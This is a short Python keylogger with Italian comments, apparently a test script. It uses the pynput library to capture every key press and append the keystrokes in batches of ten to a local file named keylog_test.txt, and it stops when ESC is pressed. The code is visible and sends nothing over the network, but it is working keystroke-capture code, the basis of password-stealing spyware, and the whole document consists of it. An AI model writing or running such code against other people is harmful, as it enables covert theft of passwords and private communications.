from pynput import keyboard

log_file = "keylog_test.txt"
buffer = []

# crea subito un file, così siamo sicuri che esiste
with open(log_file, "a") as f:
    f.write("Keylogger avviato...\n")

print("[+] Keylogger in esecuzione. Premi ESC per uscire.")

def on_press(key):
    try:
        buffer.append(key.char)
    except AttributeError:
        buffer.append(f'[{key}]')

    if len(buffer) >= 10:  # abbassato a 10 tasti
        with open(log_file, "a") as f:
            f.write("".join(buffer))
        buffer.clear()

def on_release(key):
    if key == keyboard.Key.esc:
        if buffer:
            with open(log_file, "a") as f:
                f.write("".join(buffer))
        print("\n[+] Terminato.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
